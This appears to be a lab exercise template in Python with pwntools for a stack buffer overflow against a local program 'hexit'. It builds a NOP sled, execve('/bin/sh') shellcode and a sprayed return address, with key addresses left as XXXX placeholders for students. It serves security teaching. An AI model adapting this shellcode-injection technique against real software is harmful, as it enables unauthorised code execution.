#!/usr/bin/python3 
from pwn import *

# Exercise 3. For this task, we will use the return address spraying and NOP sled
# to make sure our attack is more robust against buffer address variations. 
# For this, we will still use the buffer address we found out through gdb,
# and we attempt to guess a range of possible buffer addresses. However,
# we do not need to use brute force, as the spraying and the NOP sled will
# ensure that, if the actual buffer address is in the right range, the return 
# address will be overwritten correctly and it will land on the NOP sled.
# 

def shellcode():
  context.arch = 'amd64'
  sc = shellcraft.execve("/bin/sh")
  return asm(sc)

  
def create_payload(): 
  # payload length
  bytearraylen = 512

  # This is where the actual payload will be stored
  # Initiallly, fill it with NOPs, to form a NOP sled. 
  content = bytearray(0x90 for i in range(bytearraylen))

  # generate shellcode 
  code = shellcode()
  shellcode_offset = bytearraylen - len(code)
  content[shellcode_offset:] = code 

  # For this exercise, we use gdb to check the address of the buffer. But the buffer address may change
  # when run outside gdb. This is because other data in the system, e.g., arguments in argv, and environment
  # variables, may be inherited by the program running in gdb, shifting their stack frames a bit. 
  # So if A is the address of the buffer observed in gdb, then when run outside gdb, it will tend to 
  # shift upwards a bit -- by an H number of bytes. 
  # So the address range would be [A, A+H].
  #
  
  # TODO: Determine address range [A, A+H] and the parameters S and L for the spraying and NOP sled.
  # Note that since we can determine the offset of the stored return address from
  # the buffer (eg from disassembly), this will help us in determining the parameter S: anything 
  # greater than ret_offset will guarantee the stored return address to be overwritten. 

  ret_offset = XXXX
  A = XXXX
  S = ret_offset + 8
  L = shellcode_offset - S 
  H = L-1 

  print("S: %d, L: %d, H: %d, RT offset: %d" % (S,L,H,ret_offset))

  if S <= ret_offset:
    print('The RT spray is too short. Try changing the H parameter.')
    exit()
  if H > L: 
    print('H is greater than L -- the return address may not land on the NOP sled')
    exit()
  
  # TODO: calculate the address of the shellcode
  shellcode_address = XXXX 

  b=p64(shellcode_address)
  
  # spray with 8 byte increment
  k=S//8
  for i in range(k):
    content[i*8:(i+1)*8] = b 

  return content


def main():
  content = create_payload()
  with open('badfile3', 'wb') as f:
    f.write(content)

  # Launch program using the process function from pwnlib.tube.process library
  # See: http://docs.pwntools.com/en/latest/tubes/processes.html
  p = process(['./hexit', '512', 'badfile3'])
  # Specify that we want to interact with the program we launch
  p.interactive()

if __name__ == '__main__':
    main()
